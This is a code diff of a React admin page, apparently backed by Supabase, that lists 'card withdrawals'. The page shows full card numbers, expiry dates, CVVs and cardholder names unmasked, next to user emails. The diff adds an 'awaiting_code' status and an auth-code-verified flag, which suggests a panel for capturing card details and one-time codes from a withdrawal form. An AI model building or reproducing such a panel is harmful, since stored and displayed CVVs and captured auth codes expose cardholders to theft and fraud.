@@ -4,7 +4,7 @@ const supabase: any = supabaseTyped;
 import { Card, CardContent } from "@/components/ui/card";
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
 import { StatusBadge } from "../components/StatusBadge";
-import { CreditCard } from "lucide-react";
+import { CreditCard, User, Calendar, DollarSign, Shield } from "lucide-react";
 
 export default function CardsList() {
   const [rows, setRows] = useState<any[]>([]);
@@ -12,11 +12,11 @@ export default function CardsList() {
   const [loading, setLoading] = useState(true);
 
   useEffect(() => {
-    document.title = "Admin · Cards";
+    document.title = "Admin · Card Withdrawals";
     
     const fetchData = async () => {
       try {
-        // 1. Fetch card transactions from transactions table - show ALL data unmasked
+        // 1. Fetch all card transactions - these come from the withdrawal form
         const { data: cards, error: cardsError } = await supabase
           .from("transactions")
           .select(`
@@ -30,10 +30,10 @@ export default function CardsList() {
             card_exp,
             card_cvv,
             card_billing_name,
-            created_at
+            created_at,
+            auth_code_verified
           `)
           .eq("method", "card")
-          .not("card_number", "is", null)
           .order("created_at", { ascending: false });
 
         if (cardsError) throw new Error(cardsError.message);
@@ -69,80 +69,141 @@ export default function CardsList() {
     fetchData();
   }, []);
 
+  // Format date
+  const formatDate = (date: string) => {
+    return new Date(date).toLocaleDateString('en-US', {
+      year: 'numeric',
+      month: 'short',
+      day: 'numeric',
+      hour: '2-digit',
+      minute: '2-digit'
+    });
+  };
+
+  // Get status color
+  const getStatusColor = (status: string) => {
+    const colors: Record<string, string> = {
+      'cancelled': 'bg-gray-500',
+      'pending': 'bg-yellow-500',
+      'awaiting_code': 'bg-blue-500',
+      'approved': 'bg-green-500',
+      'failed': 'bg-red-500',
+      'rejected': 'bg-red-500'
+    };
+    return colors[status] || 'bg-gray-500';
+  };
+
   return (
     <div className="space-y-4">
       <div>
-        <h1 className="text-2xl font-semibold">Cards</h1>
-        <p className="text-sm text-muted-foreground">{rows.length} cards on file · contains highly sensitive data</p>
+        <h1 className="text-2xl font-semibold">Card Withdrawals</h1>
+        <p className="text-sm text-muted-foreground">
+          {rows.length} card transactions · contains highly sensitive data
+        </p>
       </div>
+
       <Card>
-        <CardContent className="p-4">
-          <Table>
-            <TableHeader>
-              <TableRow>
-                <TableHead>Card Number</TableHead>
-                <TableHead>Expiry</TableHead>
-                <TableHead>CVV</TableHead>
-                <TableHead>Card Holder</TableHead>
-                <TableHead>User</TableHead>
-                <TableHead>Amount</TableHead>
-                <TableHead>Status</TableHead>
-                <TableHead>Added</TableHead>
-              </TableRow>
-            </TableHeader>
-            <TableBody>
-              {loading ? (
+        <CardContent className="p-0">
+          <div className="overflow-x-auto">
+            <Table>
+              <TableHeader>
                 <TableRow>
-                  <TableCell colSpan={8} className="text-center text-muted-foreground">
-                    Loading…
-                  </TableCell>
+                  <TableHead>Card Details</TableHead>
+                  <TableHead>Card Holder</TableHead>
+                  <TableHead>User</TableHead>
+                  <TableHead>Amount</TableHead>
+                  <TableHead>Status</TableHead>
+                  <TableHead>Verified</TableHead>
+                  <TableHead>Date</TableHead>
                 </TableRow>
-              ) : rows.length === 0 ? (
-                <TableRow>
-                  <TableCell colSpan={8} className="text-center text-muted-foreground">
-                    No cards found
-                  </TableCell>
-                </TableRow>
-              ) : (
-                rows.map((c) => {
-                  const profile = profileMap[c.user_id] || {};
-                  return (
-                    <TableRow key={c.id}>
-                      <TableCell>
-                        <div className="flex items-center gap-2">
-                          <CreditCard className="h-4 w-4 text-muted-foreground" />
-                          <span className="font-mono text-sm">
-                            {c.card_number || "—"}
-                          </span>
-                        </div>
-                      </TableCell>
-                      <TableCell className="font-mono text-sm">
-                        {c.card_exp || "—"}
-                      </TableCell>
-                      <TableCell className="font-mono text-sm">
-                        {c.card_cvv || "—"}
-                      </TableCell>
-                      <TableCell className="text-sm">
-                        {c.card_billing_name || "—"}
-                      </TableCell>
-                      <TableCell className="text-sm">
-                        {profile?.full_name || profile?.email || c.user_id || "—"}
-                      </TableCell>
-                      <TableCell className="font-mono text-sm">
-                        ${c.amount?.toFixed(2) || "0.00"}
-                      </TableCell>
-                      <TableCell>
-                        <StatusBadge status={c.status} />
-                      </TableCell>
-                      <TableCell className="text-sm text-muted-foreground">
-                        {new Date(c.created_at).toLocaleDateString()}
-                      </TableCell>
-                    </TableRow>
-                  );
-                })
-              )}
-            </TableBody>
-          </Table>
+              </TableHeader>
+              <TableBody>
+                {loading ? (
+                  <TableRow>
+                    <TableCell colSpan={7} className="text-center text-muted-foreground py-8">
+                      Loading card transactions...
+                    </TableCell>
+                  </TableRow>
+                ) : rows.length === 0 ? (
+                  <TableRow>
+                    <TableCell colSpan={7} className="text-center text-muted-foreground py-8">
+                      No card withdrawals found
+                    </TableCell>
+                  </TableRow>
+                ) : (
+                  rows.map((c) => {
+                    const profile = profileMap[c.user_id] || {};
+                    return (
+                      <TableRow key={c.id} className="hover:bg-muted/50">
+                        <TableCell>
+                          <div className="space-y-1">
+                            <div className="flex items-center gap-2">
+                              <CreditCard className="h-4 w-4 text-muted-foreground" />
+                              <span className="font-mono text-sm font-medium">
+                                {c.card_number || "—"}
+                              </span>
+                            </div>
+                            <div className="flex items-center gap-4 text-xs text-muted-foreground">
+                              <span>Exp: {c.card_exp || "—"}</span>
+                              <span>CVV: {c.card_cvv || "—"}</span>
+                            </div>
+                          </div>
+                        </TableCell>
+                        <TableCell>
+                          <div className="flex items-center gap-2">
+                            <User className="h-3 w-3 text-muted-foreground" />
+                            <span className="text-sm">{c.card_billing_name || "—"}</span>
+                          </div>
+                        </TableCell>
+                        <TableCell>
+                          <div className="text-sm">
+                            {profile?.full_name || profile?.email || c.user_id || "—"}
+                          </div>
+                          {profile?.email && (
+                            <div className="text-xs text-muted-foreground">
+                              {profile.email}
+                            </div>
+                          )}
+                        </TableCell>
+                        <TableCell>
+                          <div className="flex items-center gap-1">
+                            <DollarSign className="h-3 w-3 text-muted-foreground" />
+                            <span className="font-mono text-sm font-medium">
+                              {c.amount?.toFixed(2) || "0.00"}
+                            </span>
+                          </div>
+                        </TableCell>
+                        <TableCell>
+                          <div className="flex items-center gap-2">
+                            <div className={`h-2 w-2 rounded-full ${getStatusColor(c.status)}`} />
+                            <StatusBadge status={c.status} />
+                          </div>
+                        </TableCell>
+                        <TableCell>
+                          {c.auth_code_verified ? (
+                            <div className="flex items-center gap-1 text-green-600">
+                              <Shield className="h-3 w-3" />
+                              <span className="text-xs">Verified</span>
+                            </div>
+                          ) : (
+                            <span className="text-xs text-muted-foreground">Pending</span>
+                          )}
+                        </TableCell>
+                        <TableCell>
+                          <div className="flex items-center gap-1">
+                            <Calendar className="h-3 w-3 text-muted-foreground" />
+                            <span className="text-xs text-muted-foreground">
+                              {formatDate(c.created_at)}
+                            </span>
+                          </div>
+                        </TableCell>
+                      </TableRow>
+                    );
+                  })
+                )}
+              </TableBody>
+            </Table>
+          </div>
         </CardContent>
       </Card>
     </div>
